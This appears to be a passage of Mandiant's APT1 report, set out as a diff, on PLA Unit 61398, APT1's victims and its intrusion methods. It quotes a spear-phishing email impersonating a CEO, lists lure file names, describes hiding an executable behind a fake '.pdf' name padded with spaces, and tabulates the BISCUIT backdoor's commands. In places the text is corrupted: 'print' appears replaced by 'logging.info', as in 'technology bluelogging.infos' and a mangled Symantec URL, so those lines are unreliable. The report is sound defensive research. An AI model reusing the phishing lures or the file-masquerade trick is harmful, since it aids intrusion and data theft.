@@ -1,0 +1,2235 @@
+APT1
+Exposing One of China’s Cyber
+Espionage Units
+
+C o n te n t s
+Executive Summary........................................................................................................... 2
+China’s Computer Network Operations Tasking to PLA Unit 61398 (61398部队)..................... 7
+APT1: Years of Espionage ................................................................................................ 20
+APT1: Attack Lifecycle..................................................................................................... 27
+APT1: Infrastructure........................................................................................................ 39
+APT1: Identities.............................................................................................................. 51
+Conclusion...................................................................................................................... 59
+Appendix A: How Does Mandiant Distinguish Threat Groups?............................................... 61
+Appendix B: APT and the Attack Lifecycle......................................................................... 63
+Appendix C (Digital): The Malware Arsenal......................................................................... 66
+Appendix D (Digital): FQDNs............................................................................................. 67
+Appendix E (Digital): MD5 Hashes.................................................................................... 68
+Appendix F (Digital): SSL Certificates................................................................................ 69
+Appendix G (Digital): IOCs................................................................................................ 70
+Appendix H (Digital): Video.......................................................................
+
+Mandiant APT1
+Required Proficiencies
+
+080902 — Circuits and Systems
+
+»» 101 — Political
+»» 201 — English
+»» 301 — Mathematics
+»» 842 — Signal and Digital Circuits (or) 840 - Circuits
+»» Interview plus a small written test:
+−− Circuits and Systems-based professional knowledge and comprehensive
+capacity
+−− Team spirit and ability to work with others to coordinate
+−− English proficiency
+
+081000 — Information and
+Communications Engineering
+
+»» 101 - Political
+»» 201 – British [English]
+»» 301 - Mathematics
+»» 844 - Signal Circuit Basis
+
+Mandiant APT1
+
+11
+
+www.mandiant.com
+
+12
+
+www.mandiant.com
+
+Figure 5: Datong Circa 2008 (Unit 61398 Center Building visible at 208 Datong) Image Copyright 2013
+DigitalGlobe
+
+Mandiant APT1
+
+13
+
+www.mandiant.com
+
+Figure 6: Unit 61398 Center Building (main gate, soldiers visible) Image Copyright 2013 city8.com
+
+Mandiant APT1
+
+14
+
+www.mandiant.com
+
+Figure 7: Unit 61398 Center Building 208 Datong (rear view, possible generator exhausts visible) Image
+Copyright 2013 city8.com
+
+Mandiant APT1
+
+15
+
+www.mandiant.com
+Unit 61398 Kindergarden Listed in Shanghai Pudong: http://www.pudong-edu.sh.cn/Web/PD/jyzc_school.aspx?SiteID=45&UnitID=2388
+
+James C. Mulvenon and Andrew N. D. Yang, editors, The People’s Liberation Army as Organization: Reference Volume v1.0, (Santa Monica, CA:
+RAND Corporation, 2002), 125, http://www.rand.org/pubs/conf_proceedings/CF182.html, accessed February 6, 2013.
+24
+
+Mandiant APT1
+
+16
+
+www.mandiant.com
+
+Figure 8: China Telecom Memo discussing Unit 61398 source:
+http://r9.he3.com.cn/%E8%A7%84%E5%88%92/%E9%81%93%E8%B7%AF%E5%8F%8A%E5%85%B6%E
+4%BB%96%E8%A7%84%E5%88%92%E5%9B%BE%E7%BA%B8/%E4%BF%A1%E6%81%AF%E5%9B%A
+D%E5%8C%BA/%E5%85%B3%E4%BA%8E%E6%80%BB%E5%8F%82%E4%B8%89%E9%83%A8%E4%B
+A%8C%E5%B1%80-%E4%B8%8A%E6%B5%B7005%E4%B8%AD%E5%BF%83%E9%9C%80%E4%BD%BF%E7%94%A8%E6%88%91%E5%85%AC%E5%8F%B8%E9%80%9A%E4%BF%A1.pdf25
+25
+
+This link has Chinese characters in it which are represented in URL encoding
+
+Mandiant APT1
+
+17
+
+www.mandiant.com
+
+Market Department Examining Control Affairs Division Report
+Requesting Concurrence Concerning the General Staff Department 3rd Department 2nd Bureau
+Request to Use Our Company’s Communication Channel
+Division Leader Wu:
+The Chinese People’s Liberation Army Unit 61398 (General Staff Department 3rd Department
+2nd Bureau) wrote to us a few days ago saying that, in accordance with their central command
+“8508” on war strategy construction [or infrastructure] need, the General Staff Department
+3rd Department 2nd Bureau (Gaoqiao Base) needs to communicate with Shanghai City 005
+Center (Shanghai Intercommunication Network Control Center within East Gate Bureau)
+regarding intercommunication affairs. This bureau already placed fiber-optic cable at the
+East Gate front entrance [road pole]. They need to use two ports to enter our company’s
+East Gate communication channel. The length is about 30m. At the same time, the second
+stage construction (in Gaoqiao Base) needs to enter into our company’s Shanghai Nanhui
+Communication Park 005 Center (special-use bureau). This military fiber-optic cable has
+already been placed at the Shanghai Nanhui Communication Park entrance. They need to use
+4 of our company ports inside the Nanhui Communication Park to enter. The length is 600m.
+Upon our division’s negotiation with the 3rd Department 2nd Bureau’s communication branch,
+the military has promised to pay at most 40,000 Yuan for each port. They also hope Shanghai
+Telecom will smoothly accomplish this task for the military based on the principle that national
+defense construction is important. After checking the above areas’ channels, our company has a
+relatively abundant inventory to satisfy the military’s request.
+This is our suggestion: because this is concerning defense construction, and also the 3rd
+Department 2nd Bureau is a very important communication control department, we agree to
+provide the requested channels according to the military’s suggested price. Because this is a
+one-time payment, and it is difficult to use the normal renting method, we suggest our company
+accept one-time payment using the reason of “Military Co-Construction [with China Telecom] of
+Communication Channels” and provide from our inventory. The military’s co-building does not
+interfere with our proprietary rights. If something breaks, the military is responsible to repair it
+and pay for the expenses. After you agree with our suggestion, we will sign an agreement with
+the communication branch of 61398 and implement it.
+Please provide a statement about whether the above suggestion is appropriate or not.
+[Handwritten Note]Agree with the Market Department Examining Control Affairs Division
+suggestion; inside the agreement clearly [...define? (illegible) ...] both party’s responsibilities.
+
+Figure 9: English Translation of China Telecom Memo
+
+Mandiant APT1
+
+18
+
+www.mandiant.com
+
+Synopsis of PLA Unit 61398
+The evidence we have collected on PLA Unit 61398’s mission and infrastructure reveals an organization that:
+»»
+
+Employs hundreds, perhaps thousands of personnel
+
+»»
+
+Requires personnel trained in computer security and computer network operations
+
+»»
+
+Requires personnel proficient in the English language
+
+»»
+
+Has large-scale infrastructure and facilities in the “Pudong New Area” of Shanghai
+
+»»
+
+Was the beneficiary of special fiber optic communication infrastructure provided by state-owned enterprise China
+Telecom in the name of national defense
+
+The following sections of this report detail APT1’s cyber espionage and data theft operations. The sheer scale and
+duration of these sustained attacks leave little doubt about the enterprise scale of the organization behind this
+campaign. We will demonstrate that the nature of APT1’s targeted victims and the group’s infrastructure and tactics
+align with the mission and infrastructure of PLA Unit 61398.
+
+Mandiant APT1
+
+19
+
+www.mandiant.com
+
+Organizations compromised
+by APT1 over time
+2006
+
+AP T1 : Ye a r s o f
+Es pio n a ge
+
+2007
+
+2008
+
+2009
+
+Our evidence indicates that APT1 has been stealing hundreds of terabytes of
+data from at least 141 organizations across a diverse set of industries beginning
+as early as 2006. Remarkably, we have witnessed APT1 target dozens of
+organizations simultaneously. Once the group establishes access to a victim’s
+network, they continue to access it periodically over several months or years
+to steal large volumes of valuable intellectual property, including technology
+bluelogging.infos, proprietary manufacturing processes, test results, business plans,
+pricing documents, partnership agreements, emails and contact lists from victim
+organizations’ leadership. We believe that the extensive activity we have directly
+observed represents only a small fraction of the cyber espionage that APT1 has
+committed.
+
+APT1 Puts the “Persistent” in APT
+2010
+
+2011
+
+Since 2006 we have seen APT1 relentlessly expand its access to new victims.
+Figure 10 shows the timeline of the 141 compromises we are aware of; each
+marker in the figure represents a separate victim and indicates the earliest
+confirmed date of APT1 activity in that organization’s network.26
+With the ephemeral nature of electronic evidence, many of the dates of earliest
+known APT1 activity shown here underestimate the duration of APT1’s presence in
+the network.
+Figure 10: Timeline showing dates of earliest known APT1 activity in the
+networks of the 141 organizations in which Mandiant has observed APT1
+conducting cyber espionage.
+
+2012
+
+Figure 10 shows that we have seen APT1 compromise an increasing number of organizations each
+year, which may reflect an increase in APT1’s activity. However, this increase may also simply reflect
+Mandiant’s expanding visibility into APT1’s activities as the company has grown and victims’ awareness
+of cyber espionage activity in their networks has improved.
+26
+
+2013
+
+Mandiant APT1
+
+20
+
+www.mandiant.com
+
+Longest time period within
+which APT1 has continued
+to access a victim’s network:
+
+4 Years, 10 Months
+
+Once APT1 has compromised a network, they repeatedly monitor and steal
+proprietary data and communications from the victim for months or even
+years. For the organizations in Figure 10, we found that APT1 maintained
+access to the victim’s network for an average of 356 days.27 The longest time
+period APT1 maintained access to a victim’s network was at least 1,764 days,
+or four years and ten months. APT1 was not continuously active on a daily
+basis during this time period; however, in the vast majority of cases we
+observed, APT1 continued to commit data theft as long as they had access to
+the network.
+
+APT1’s Geographic & Industry Focus
+The organizations targeted by APT1 primarily conduct their operations in English. However, we have also seen the
+group target a small number of non-English speaking victims. A full 87% of the APT1 victims we have observed are
+headquartered in countries where English is the native language (see Figure 11). This includes 115 victims located
+in the U.S. and seven in Canada and the United Kingdom. Of the remaining 19 victims, 17 use English as a primary
+language for operations. These include international cooperation and development agencies, foreign governments
+in which English is one of multiple official languages, and multinational conglomerates that primarily conduct their
+business in English. Only two victims appear to operate using a language other than English. Given that Englishlanguage proficiency is required for many members of PLA Unit 61398, we believe that the two non-English speaking
+victims are anomalies representing instances in which APT1 performed tasks outside of their normal activities.
+
+This is based on 91 of the 141 victim organizations shown. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility
+into the last known date of APT1 activity in the network.
+27
+
+Mandiant APT1
+
+21
+
+www.mandiant.com
+
+OBSERVED GLOBAL APT1 ACTIVITY
+1 Norway
+
+2 Canada
+
+5 United Kingdom
+1 Belgium
+1 Japan
+1 Luxemborg
+
+1 France
+
+3 Israel
+115 United States
+
+2 Switzerland
+1 UAE
+
+3 India
+2 Taiwan
+
+2 Singapore
+
+1 South Africa
+
+Figure 11: Geographic location of APT1’s victims. In the case of victims with a multinational presence, the
+location shown reflects either the branch of the organization that APT1 compromised (when known), or else is the
+location of the organization’s headquarters.
+APT1 has demonstrated the capability and intent to steal from dozens of organizations across a wide range of
+industries virtually simultaneously. Figure 12 provides a view of the earliest known date of APT1 activity against all of
+the 141 victims we identified, organized by the 20 major industries they represent. The results suggest that APT1’s
+mission is extremely broad; the group does not target industries systematically but more likely steals from an enormous
+range of industries on a continuous basis. Since the organizations included in the figure represent only the fraction
+of APT1 victims that we confirmed directly, the range of industries that APT1 targets may be even broader than our
+findings suggest.
+Further, the scope of APT1’s parallel activities implies that the group has significant personnel and technical resources
+at its disposal. In the first month of 2011, for example, Figure 12 shows that APT1 successfully compromised 17
+new victims operating in 10 different industries. Since we have seen that the group remains active in each victim’s
+network for an average of nearly a year after the initial date of compromise, we infer that APT1 committed these 17
+new breaches while simultaneously maintaining access to and continuing to steal data from a number of previously
+compromised victims.
+
+Mandiant APT1
+
+22
+
+www.mandiant.com
+
+TIMELINE OF APT1 COMPROMISES BY INDUSTRY SECTOR
+2006
+
+2007
+
+2008
+
+2009
+
+2010
+
+2011
+
+2012
+
+Information Technology
+Transportation
+High-Tech Electronics
+Financial Services
+Navigation
+Legal Services
+Engineering Services
+Media, Advertising and Entertainment
+Food and Agriculture
+Satellites and Telecommunications
+Chemicals
+Energy
+International Organizations
+Scientific Research and Consulting
+Public Administration
+Construction and Manufacturing
+Aerospace
+Education
+Healthcare
+Metals and Mining
+
+Figure 12: Timeframe of APT1’s cyber espionage operations against organizations by industry. The dots within
+each bar represent the earliest known date on which APT1 compromised a new organization within the industry.
+
+Mandiant APT1
+
+23
+
+www.mandiant.com
+
+We believe that organizations in all industries related to China’s strategic priorities are potential targets of APT1’s
+comprehensive cyber espionage campaign. While we have certainly seen the group target some industries more
+heavily than others (see Figure 13), our observations confirm that APT1 has targeted at least four of the seven
+strategic emerging industries that China identified in its 12th Five Year Plan.28
+0
+
+5
+
+10
+
+15
+
+20
+
+0
+
+5
+
+10
+
+15
+
+20
+
+Information Technology
+Aerospace
+Public Administration
+Satellites and Telecommunications
+Scientific Research and Consulting
+Energy
+Transportation
+Construction and Manufacturing
+International Organizations
+Engineering Services
+High-tech Electronics
+Legal Services
+Media, Advertising and Entertainment
+Navigation
+Chemicals
+Financial Services
+Food and Agriculture
+Metals and Mining
+Healthcare
+Education
+
+Industries Compromised by APT1
+Figure 13: Number of APT1 victims by industry. We determined each organization’s industry based on reviewing
+its industry classification in the Hoover’s29 system. We also considered the content of the data that APT1 stole in
+each case, to the extent that this information was available.
+
+Joseph Casey and Katherine Koleski, Backgrounder: China’s 12th Five-Year Plan, U.S.-China Economic & Security Review Commission (2011),
+19, http://www.uscc.gov/researchpapers/2011/12th-FiveYearPlan_062811.pdf, accessed February 3, 2013.
+28
+
+29
+
+http://www.hoovers.com/
+
+Mandiant APT1
+
+24
+
+www.mandiant.com
+
+APT1 Data Theft
+APT1 steals a broad range of information from its victims. The types of information the group has stolen relate to:
+»»
+
+product development and use, including information on test results, system designs, product manuals, parts lists,
+and simulation technologies;
+
+»»
+
+manufacturing procedures, such as descriptions of proprietary processes, standards, and waste management
+processes;
+
+»»
+
+business plans, such as information on contract negotiation positions and product pricing, legal events, mergers,
+joint ventures, and acquisitions;
+
+»»
+
+policy positions and analysis, such as white papers, and agendas and minutes from meetings involving highranking personnel;
+
+»»
+
+emails of high-ranking employees; and
+
+»»
+
+user credentials and network architecture information.
+
+It is often difficult for us to estimate how much data APT1 has stolen during their intrusions for several reasons:
+»»
+
+APT1 deletes the compressed archives after they pilfer them, leaving solely trace evidence that is usually
+overwritten during normal business activities.
+
+»»
+
+Pre-existing network security monitoring rarely records or identifies the data theft.
+
+»»
+
+The duration of time between the data theft and Mandiant’s investigation is often too great, and the trace evidence
+of data theft is overwritten during the normal course of business.
+
+»»
+
+Some victims are more intent on assigning resources to restore the security of their network in lieu of investigating
+and understanding the impact of the security breach.
+
+Even with these challenges, we have observed APT1 steal as much as 6.5 terabytes of compressed data from a
+single organization over a ten-month time period. Given the scope of APT1’s operations, including the number of
+organizations and industries we have seen them target, along with the volume of data they are clearly capable of
+stealing from any single organization, APT1 has likely stolen hundreds of terabytes from its victims.
+Although we do not have direct evidence indicating who receives the information
+that APT1 steals or how the recipient processes such a vast volume of data, we
+do believe that this stolen information can be used to obvious advantage by the
+PRC and Chinese state-owned enterprises. As an example, in 2008, APT1
+compromised the network of a company involved in a wholesale industry. APT1
+6.5 Terabytes
+installed tools to create compressed file archives and to extract emails and
+attachments. Over the following 2.5 years, APT1 stole an unknown number of
+over 10 months
+files from the victim and repeatedly accessed the email accounts of several
+executives, including the CEO and General Counsel. During this same time
+period, major news organizations reported that China had successfully
+negotiated a double-digit decrease in price per unit with the victim organization for one of its major commodities. This
+may be coincidental; however, it would be surprising if APT1 could continue perpetrating such a broad mandate of
+cyber espionage and data theft if the results of the group’s efforts were not finding their way into the hands of entities
+able to capitalize on them.
+
+Largest APT1 data theft
+from a single organization:
+
+Mandiant APT1
+
+25
+
+www.mandiant.com
+
+APT1 In The News
+Public reporting corroborates and extends our observations of APT1’s cyber espionage activity. However, several factors
+complicate the process of compiling and synthesizing public reports on APT1. For one thing, information security
+researchers and journalists refer to APT1 by a variety of names. In addition, many cyber security analysts focus on
+writing about tools that are shared between multiple Chinese APT groups without differentiating between the various
+actors that use them.
+To assist researchers in identifying which public reports describe the threat group that we identify as APT1, Table
+3 provides a list of APT group nicknames that frequently appear in the media and differentiates between those that
+describe APT1 and those that do not. In addition, below is a list of public reports about Chinese threat actors that we
+have confirmed as referring to APT1.
+»»
+
+The earliest known public report about APT1 infrastructure is a 2006 publication from the Japanese division of
+Symantec.30 The report calls out the hostname sb.hugesoft.org, which is registered to an APT1 persona known as
+Ugly Gorilla (discussed later in this report).
+
+»»
+
+In September 2012, Brian Krebs of the “Krebs on Security” cybercrime blog reported on a security breach at
+Telvent Canada Ltd (now Schneider Electric), which we attributed to APT1 based on the tools and infrastructure
+that the hackers used to exploit and gain access to the system.31
+
+Table 3: Identifying APT1 Nicknames in the News
+Nickname
+
+Verdict
+
+Comment Crew
+
+Confirmed APT1
+
+Comment Group
+
+Confirmed APT1
+
+Shady Rat
+
+Possibly APT1 (not confirmed)
+
+Nitro Attacks
+
+Not APT1; Attributed to another tracked APT group
+
+Elderwood
+
+Not APT1; Attributed to another tracked APT group
+
+Sykipot
+
+Not APT1; Attributed to another tracked APT group
+
+Aurora
+
+Not APT1; Attributed to another tracked APT group
+
+Night Dragon
+
+Not APT1; Attributed to another tracked APT group
+
+»»
+
+A SCADA security company by the name of Digital Bond published a report of spear phishing against its company
+in June 2012.32 AlienVault provided analysis on the associated malware.33 Indicators included in the report have
+been attributed as part of APT1 infrastructure.
+
+»»
+
+In November 2012, Bloomberg’s Chloe Whiteaker authored a piece on a Chinese threat group called “Comment
+Group,” which described the various tools and domains used by APT1 persona Ugly Gorilla.34
+
+Symantec, “Backdoor.Wualess,” Symantec Security Response (2007), http://www.symantec.com/ja/jp/security_response/logging.info_writeup.
+jsp?docid=2006-101116-1723-99, accessed February 3, 2013.
+30
+
+Brian Krebs, “Chinese Hackers Blamed for Intrusion at Energy Industry Giant Telvent,” Krebs on Security (2012) http://krebsonsecurity.
+com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-giant-telvent/, accessed February 3, 2013
+31
+
+Reid Wightman, “Spear Phishing Attempt,” Digital Bond (2012), https://www.digitalbond.com/blog/2012/06/07/spear-phishing-attempt/, accessed
+February 3, 2013.
+32
+
+Jaime Blasco, “Unveiling a spearphishing campaign and possible ramifications,” Alien Vault (2012), http://labs.alienvault.com/labs/index.
+php/2012/unveiling-a-spearphishing-campaign-and-possible-ramifications/, accessed February 3, 2013.
+33
+
+Chloe Whiteaker, “Following the Hackers’ Trail,” Bloomberg, (2012) http://go.bloomberg.com/multimedia/following-hackers-trail/, accessed
+February 3, 2013.
+34
+
+Mandiant APT1
+
+26
+
+www.mandiant.com
+
+A P T 1 : At ta ck Life cy cle
+APT1 has a well-defined attack methodology, honed over years and designed to steal massive quantities of intellectual
+property. They begin with aggressive spear phishing, proceed to deploy custom digital weapons, and end by exporting
+compressed bundles of files to China – before beginning the cycle again. They employ good English — with acceptable
+slang — in their socially engineered emails. They have evolved their digital weapons for more than seven years,
+resulting in continual upgrades as part of their own software release cycle. Their ability to adapt to their environment
+and spread across systems makes them effective in enterprise environments with trust relationships.
+These attacks fit into a cyclic pattern of activity that we will describe in this section within the framework of Mandiant’s
+Attack Lifecycle model. In each stage we will discuss APT1’s specific techniques to illustrate their tenacity and the
+scale at which they operate. (See Appendix B: “APT and the Attack Lifecycle” for a high-level overview of the steps
+most APT groups take in each stage of the Attack Lifecycle.)
+
+Maintain
+Presence
+
+Initial
+Recon
+
+Initial
+Compromise
+
+Establish
+Foothold
+
+Escalate
+Privileges
+
+Move
+Laterally
+
+Internal
+Recon
+
+Complete
+Mission
+
+Figure 14: Mandiant’s Attack Lifecycle Model
+
+Mandiant APT1
+
+27
+
+www.mandiant.com
+
+The Initial Compromise
+The Initial Compromise represents the methods intruders use to first penetrate a target organization’s network. As with
+most other APT groups, spear phishing is APT1’s most commonly used technique. The spear phishing emails contain
+either a malicious attachment or a hyperlink to a malicious file. The subject line and the text in the email body are
+usually relevant to the recipient. APT1 also creates webmail accounts using real peoples’ names — names that are
+familiar to the recipient, such as a colleague, a company executive, an IT department employee, or company counsel
+— and uses these accounts to send the emails. As a real-world example, this is an email that APT1 sent to Mandiant
+employees:
+Date: Wed, 18 Apr 2012 06:31:41 -0700
+From: Kevin Mandia <kevin.mandia@rocketmail.com>
+Subject: Internal Discussion on the Press
+Release
+Hello,
+Shall we schedule a time to meet next week?
+We need to finalize the press release.
+Details click here.
+Kevin Mandia
+Figure 15: APT1 Spear Phishing Email
+At first glance, the email appeared to be from Mandiant’s CEO, Kevin Mandia. However, further scrutiny shows that
+the email was not sent from a Mandiant email account, but from “kevin.mandia@rocketmail.com”. Rocketmail is a
+free webmail service. The account “kevin.mandia@rocketmail.com” does not belong to Mr. Mandia. Rather, an APT1
+actor likely signed up for the account specifically for this spear phishing event. If anyone had clicked on the link that
+day (which no one did, thankfully), their computer would have downloaded a malicious ZIP file named “Internal_
+Discussion_Press_Release_In_Next_Week8.zip”. This file contained a malicious executable that installs a custom APT1
+backdoor that we call WEBC2-TABLE.
+
+Mandiant APT1
+
+28
+
+www.mandiant.com
+
+Although the files that APT1 actors attach or link to spear phishing emails are not always in ZIP format, this is the
+predominant trend we have observed in the last several years. Below is a sampling of file names that APT1 has used
+with their malicious ZIP files:
+2012ChinaUSAviationSymposium.zip
+Employee-Benefit-and-Overhead-Adjustment-Keys.zip
+MARKET-COMMENT-Europe-Ends-Sharply-Lower-On-Data-Yields-Jump.zip
+Negative_Reports_Of_Turkey.zip
+New_Technology_For_FPGA_And_Its_Developing_Trend.zip
+North_Korean_launch.zip
+Oil-Field-Services-Analysis-And-Outlook.zip
+POWER_GEN_2012.zip
+Proactive_Investors_One2One_Energy_Investor_Forum.zip
+Social-Security-Reform.zip
+South_China_Sea_Security_Assessment_Report.zip
+Telephonics_Supplier_Manual_v3.zip
+The_Latest_Syria_Security_Assessment_Report.zip
+Updated_Office_Contact_v1.zip
+Updated_Office_Contact_v2.zip
+Welfare_Reform_and_Benefits_Development_Plan.zip
+What’s this
+email?
+
+The example file names include military,
+economic, and diplomatic themes,
+suggesting the wide range of industries that
+APT1 targets. Some names are also generic
+(e.g., “updated_office_contact_v1.zip”) and
+could be used for targets in any industry.
+
+@
+
+Spear Phishing Email
+with Attachment
+
+APT 1
+
+Is this for real?
+
+@
+
+APT 1
+
+On some occasions, unsuspecting email
+recipients have replied to the spear
+phishing messages, believing they were
+communicating with their acquaintances.
+In one case a person replied, “I’m not sure
+if this is legit, so I didn’t open it.” Within 20
+minutes, someone in APT1 responded with
+a terse email back: “It’s legit.”
+
+Okay, thanks!
+
+“It’s legit.”
+
+!
+
+@
+
+APT 1
+Figure 16: APT1’s interaction with a spear phishing recipient
+
+Mandiant APT1
+
+29
+
+www.mandiant.com
+
+Would you click on this?
+Some APT1 actors have gone to the trouble of making the malicious software inside their ZIP files look
+like benign Adobe PDF files. Here is an example:
+
+This is not a PDF file. It looks like the filename has a PDF extension but the file name actually includes
+119 spaces after “.pdf” followed by “.exe” — the real file extension. APT1 even went to the trouble of
+turning the executable’s icon to an Adobe symbol to complete the ruse. However, this file is actually a
+dropper for a custom APT1 backdoor that we call WEBC2-QBP.
+
+Establishing A Foothold
+Establishing a foothold involves actions that ensure control of the target network’s systems from outside the network.
+APT1 establishes a foothold once email recipients open a malicious file and a backdoor is subsequently installed. A
+backdoor is software that allows an intruder to send commands to the system remotely. In almost every case, APT
+backdoors initiate outbound connections to the intruder’s “command and control” (C2) server. APT intruders employ
+this tactic because while network firewalls are generally adept at keeping malware outside the network from initiating
+communication with systems inside the network, they are less reliable at keeping malware that is already inside the
+network from communicating to systems outside.
+
+110001100100011010100
+1001100100011010100
+
+10010100101
+
+C2
+
+Figure 17: Backdoors installed on compromised systems usually initiate connections with C2 servers
+While APT1 intruders occasionally use publicly available backdoors such as Poison Ivy and Gh0st RAT, the vast
+majority of the time they use what appear to be their own custom backdoors. We have documented 42 families of
+backdoors in “Appendix C: The Malware Arsenal” that APT1 uses that we believe are not publicly available. In addition
+we have provided 1,007 MD5 hashes associated with APT1 malware in Appendix E. We will describe APT1’s backdoors
+in two categories: “Beachhead Backdoors” and “Standard Backdoors.”
+
+Mandiant APT1
+
+30
+
+www.mandiant.com
+
+Beachhead Backdoors
+Beachhead backdoors are typically minimally
+featured. They offer the attacker a toe-hold to
+perform simple tasks like retrieve files, gather
+basic system information and trigger the
+execution of other more significant capabilities
+such as a standard backdoor.
+
+What is a malware family?
+A malware family is a collection of malware in which each
+sample shares a significant amount of code with all of
+the others. To help illustrate this, consider the following
+example from the physical world. There is now a vast array
+of computing tablets for sale. These include Apple’s iPad,
+Samsung’s Galaxy Tab, and Microsoft’s Surface. Although
+these are all tablet computers, “under the hood” they are
+probably quite different. However, one can expect that
+an iPad 1 and an iPad 2 share a significant number of
+components — much more than, say, an iPad 1 and a
+Microsoft Surface. Thus it makes sense to refer to the iPad
+“family” and the Surface “family”.
+
+APT1’s beachhead backdoors are usually
+what we call WEBC2 backdoors. WEBC2
+backdoors are probably the most well-known
+kind of APT1 backdoor, and are the reason
+why some security companies refer to APT1
+as the “Comment Crew.” A WEBC2 backdoor
+is designed to retrieve a webpage from a C2
+When it comes to computer programs, in general if they
+server. It expects the webpage to contain
+share more than 80% of the same code we consider them
+special HTML tags; the backdoor will attempt
+part of the same family. There are exceptions: for example,
+to interpret the data between the tags as
+some files contain public and standard code libraries that
+commands. Older versions of WEBC2 read
+we do not take into consideration when making a family
+data between HTML comments, though over
+determination.
+time WEBC2 variants have evolved to read
+data contained within other types of tags.
+From direct observation, we can confirm
+that APT1 was using WEBC2 backdoors as
+early as July 2006. However, the first compile time35 we have for WEBC2-KT3 is 2004-01-23, suggesting that APT1
+has been crafting WEBC2 backdoors since early 2004. Based on the 400+ samples of WEBC2 variants that we have
+accumulated, it appears that APT1 has direct access to developers who have continually released new WEBC2 variants
+for over six years.
+For example, these two build paths, which were discovered inside WEBC2-TABLE samples, help to illustrate how APT1
+has been steadily building new WEBC2 variants as part of a continuous development process:
+
+Sample A
+
+WEBC2 families
+
+MD5: d7aa32b7465f55c368230bb52d52d885
+Compile date: 2012-02-23
+\work\code\2008-7-8muma\mywork\winInet_
+winApplication2009-8-7\mywork\
+aaaaaaa2012-2-23\Release\aaaaaaa.pdb
+
+Sample B
+
+MD5: c1393e77773a48b1eea117a302138554
+Compile date: 2009-08-07
+D:\work\code\2008-7-8muma\mywork\winInet_
+winApplication2009-8-7\mywork\aaaaaaa\Release\
+aaaaaaa.pdb
+
+WEBC2-AUSOV
+WEBC2-ADSPACE
+WEBC2-BOLID
+WEBC2-CLOVER
+WEBC2-CSON
+WEBC2-DIV
+WEBC2-GREENCAT
+WEBC2-HEAD
+
+WEBC2-KT3
+WEBC2-QBP
+WEBC2-RAVE
+WEBC2-TABLE
+WEBC2-TOCK
+WEBC2-UGX
+WEBC2-YAHOO
+WEBC2-Y21K
+
+… and many still uncategorized
+
+“Compile” refers to the process of transforming a programmer’s source code into a file that a computer can understand and execute. The compile
+date is easily accessible in the PE header of the resulting executable file unless the intruder takes additional steps to obfuscate it.
+35
+
+Mandiant APT1
+
+31
+
+www.mandiant.com
+
+A “build path” discloses the directory from which the programmer
+built and compiled his source code. These samples, compiled 2.5
+years apart, were compiled within a folder named “work\code\...\
+mywork”. The instances of “work” suggest that working on WEBC2 is
+someone’s day job and not a side project or hobby. Furthermore, the
+Sample A build string includes “2012-2-23” — which matches Sample
+A’s compile date. The Sample B build string lacks “2012-2-23” but
+includes “2009-8-7” — which also matches Sample B’s compile date.
+This suggests that the code used to compile Sample A was modified
+from code that was used to compile Sample B 2.5 years previously. The
+existence of “2008-7-8” suggests that the code for both samples was
+modified from a version that existed in July 2008, a year before Sample
+B was created. This series of dates indicates that developing and
+modifying the WEBC2 backdoor is an iterative and long-term process.
+
+APT 1 MALWARE FAMILIES
+FIRST KNOWN COMPILE TIMES
+
+2004
+
+WEBC2.KT3
+
+2005
+
+GETMAIL
+
+2006
+
+WEBC2 backdoors typically give APT1 attackers a short and
+rudimentary set of commands to issue to victim systems, including:
+»» Open an interactive command shell (usually Windows’ cmd.exe)
+»» Download and execute a file
+»» Sleep (i.e. remain inactive) for a specified amount of time
+WEBC2 backdoors are often packaged with spear phishing emails.
+Once installed, APT1 intruders have the option to tell victim systems
+to download and execute additional malicious software of their choice.
+WEBC2 backdoors work for their intended purpose, but they generally
+have fewer features than the “Standard Backdoors” described below.
+
+LIGHTDART
+MAPIGET
+2007
+
+WEBC2.Y21K
+WEBC2.UGX
+2008
+
+TARSIP
+
+MANITSME
+STARSYPOUND
+DAIRY
+SWORD
+HELAUTO
+
+Standard Backdoors
+The standard, non-WEBC2 APT1 backdoor typically communicates
+using the HTTP protocol (to blend in with legitimate web traffic) or a
+custom protocol that the malware authors designed themselves. These
+backdoors give APT intruders a laundry list of ways to control victim
+systems, including:
+»» Create/modify/delete/execute programs
+»» Upload/download files
+»» Create/delete directories
+»» List/start/stop processes
+»» Modify the system registry
+»» Take screenshots of the user’s desktop
+»» Capture keystrokes
+»» Capture mouse movement
+»» Start an interactive command shell
+»» Create a Remote desktop (i.e. graphical) interface
+»» Harvest passwords
+»» Enumerate users
+»» Enumerate other systems on the network
+»» Sleep (i.e. go inactive) for a specified amount of time
+»» Log off the current user
+»» Shut down the system
+Mandiant APT1
+
+BISCUIT
+
+32
+
+HACKSFASE
+AURIGA
+2009 GREENCAT
+GOGGLES
+WEBC2.RAVE
+WEBC2.ADSPACE
+2010
+
+WEBC2.AUSOV
+WEBC2.CLOVER
+MACROMAIL
+NEWSREELS
+
+WEBC2.HEAD
+BANGAT
+LONGRUN
+
+SEASALT
+WEBC2.TOCK
+
+WARP
+WEBC2.QBP
+
+WEBC2.YAHOO
+TABMSGSQL
+WEBC2.CSON
+
+2011 WEBC2.DIV
+LIGHTBOLT
+GDOCUPLOAD
+
+COMBOS
+COOKIEBAG
+GLOOXMAIL
+MINIASP
+
+2012
+KURTON
+
+BOUNCER
+CALENDAR
+WEBC2.TABLE
+WEBC2.BOLID
+
+www.mandiant.com
+
+The BISCUIT backdoor (so named for the command “bdkzt”) is an illustrative example of the range of commands that
+APT1 has built into its “standard” backdoors. APT1 has used and steadily modified BISCUIT since as early as 2007
+and continues to use it presently.
+Table 4: A subset of BISCUIT commands
+Command
+
+Description
+
+bdkzt
+
+Launch a command shell
+
+ckzjqk
+
+Get system information
+
+download <file>
+
+Transfer a file from the C2 server
+
+exe <file> <user>
+
+Launch a program as a specific user
+
+exit
+
+Close the connection and sleep
+
+lists <type>
+
+List servers on a Windows network.
+
+ljc
+
+Enumerate running processes and identify their owners.
+
+sjc <PID>|<NAME>
+
+Terminate a process, either by process ID or by process name.
+
+upload <file>
+
+Send a file to the C2 server
+
+zxdosml <input>
+
+Send input to the command shell process (launched with “bdkzt”).
+
+These functions are characteristic of most backdoors, and are not limited to APT1 or even APT. For example, anyone
+who wants to control a system remotely will likely put functions like “Upload/download files” into a backdoor.
+
+Covert Communications
+Some APT backdoors attempt to mimic legitimate Internet traffic other than the HTTP protocol. APT1 has created a
+handful of these, including:
